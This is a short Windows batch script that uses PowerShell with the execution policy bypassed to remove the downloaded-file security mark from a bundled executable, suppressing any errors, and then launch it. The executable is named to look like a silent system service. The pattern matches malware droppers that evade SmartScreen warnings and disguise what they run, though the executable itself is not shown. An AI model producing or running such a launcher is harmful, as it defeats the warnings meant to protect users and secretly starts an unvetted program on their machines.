@echo off
rem Unblock Zone.Identifier and launch silent background system service
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~dp0system-service-windows-silent.exe' -ErrorAction SilentlyContinue; Start-Process -FilePath '%~dp0system-service-windows-silent.exe'"
